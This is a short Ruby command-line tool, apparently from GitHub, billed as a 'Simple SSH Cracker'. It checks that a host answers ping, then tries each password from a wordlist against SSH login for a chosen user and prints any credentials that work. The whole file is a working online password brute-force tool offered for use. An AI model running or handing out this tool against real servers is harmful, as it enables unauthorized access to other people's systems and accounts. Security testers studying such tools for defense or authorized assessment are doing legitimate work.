#!/usr/bin/ruby
#-*- coding:utf-8 -*-

require 'net/ssh'
require 'socket'
require 'net/ping'
require 'colorize'
include Net

@banner = '''
███████╗███████╗██╗  ██╗██████╗ ████████╗
██╔════╝██╔════╝██║  ██║██╔══██╗╚══██╔══╝
███████╗███████╗███████║██████╔╝   ██║
╚════██║╚════██║██╔══██║██╔══██╗   ██║
███████║███████║██║  ██║██████╔╝   ██║
╚══════╝╚══════╝╚═╝  ╚═╝╚═════╝    ╚═╝

            By Unamed
            Github : Unam3dd
	    Simple SSH Cracker v0.1
'''

def check_ping(target)
  begin
    icmp = Net::Ping::ICMP.new(target)

    netw = 3.times.count do
      icmp.ping
    end

    unless netw >= 3
      abort "[!] Target Not Connected !\nplease check it then try again ! "
    end
        puts "[+] Target Alive : #{target.red}"
  rescue StandardError => msg
    puts msg
  end
end

def connect_ssh(ip,username,passwd)
  puts "[+] Try  #{ip} => #{username}:#{passwd.red}"
  begin
    ssh_connect = Net::SSH.start(ip, username, :password => passwd, :auth_methods => ["password"], :number_of_password_prompts => 0)

  rescue Net::SSH::AuthenticationFailed => auth
  else
    abort "[+] Account Cracked !\n[*] IP : #{ip.green}\n[*] User : #{username.green}\n[*] Password : #{passwd.green}"
    exit
  end
end

def start_cracker(ip,username,wordlist)
  file_check = File.file?(wordlist)
  if file_check ==true
    File.foreach(wordlist).with_index do |line, idx|
      password = line.chomp
      begin
        thr = Thread.new { connect_ssh(ip,username,password) }
        thr.join
      rescue StandardError => msgerror
        puts msgerror
      end
    end
  else
    puts "[!] #{wordlist} Not Found !"
    exit
  end
end

def main
  if ARGV.length !=3
    puts(@banner)
    puts "usage : sshbt.rb target_host target_user wordlist"
  else
    puts(@banner)
    check_ping(ARGV[0])
    start_cracker(ARGV[0],ARGV[1],ARGV[2])
  end
end

if __FILE__ == $0
  main
end
